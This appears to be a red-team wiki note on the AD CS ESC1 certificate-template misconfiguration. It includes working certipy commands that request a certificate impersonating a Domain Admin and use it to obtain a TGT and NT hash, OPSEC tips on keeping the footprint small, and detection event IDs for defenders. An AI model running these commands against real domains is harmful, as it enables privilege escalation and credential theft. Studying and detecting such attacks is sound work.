---
title: "ESC1 — enrollee-supplied SAN on a client-auth template"
type: concept
created: 2026-09-07
updated: 2026-09-07
tags: [active-directory, ad-cs, esc, privilege-escalation, pkinit]
---

# ESC1

The archetypal AD CS escalation. A certificate template that (1) permits a
**low-privileged principal to enroll**, (2) has a **client-authentication**
EKU, and (3) sets `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` — so the **requester
supplies the SAN** — lets that low-priv user request a cert **for any account**
(e.g. a Domain Admin) and then log in as them via PKINIT.

See [[certificate-templates]] for the knobs and [[ad-cs-esc-attacks]] for the
family.

## Exploit

```bash
# request a cert for a DA by supplying their UPN as the SAN
certipy req -u user@corp.local -p 'Pass' -ca CORP-CA -template VulnTemplate \
  -upn administrator@corp.local

# authenticate with it -> TGT (and UnPAC the NT hash)
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.10
```

## Red-team notes (OPSEC)

- Runs entirely from Linux over the tunnel; the footprint is a **cert issuance
  on the CA (4886/4887)** and a **4768 cert-preauth** for the impersonated
  account — correlate-able, so pick the one target you need.
- Post-May-2022, request may need the SID extension to satisfy
  [[certificate-mapping]] enforcement; `certipy` handles the SAN either way.

## Detection

- AD CS **4886/4887** where the requester ≠ the SAN subject.
- **4768** cert-based pre-auth for a privileged account that never uses certs.

## Links

- [[ad-cs-esc-attacks]], [[certificate-templates]], [[certificate-mapping]]
- [[pkinit-unpac-the-hash]], [[certipy]], [[certified-pre-owned]]
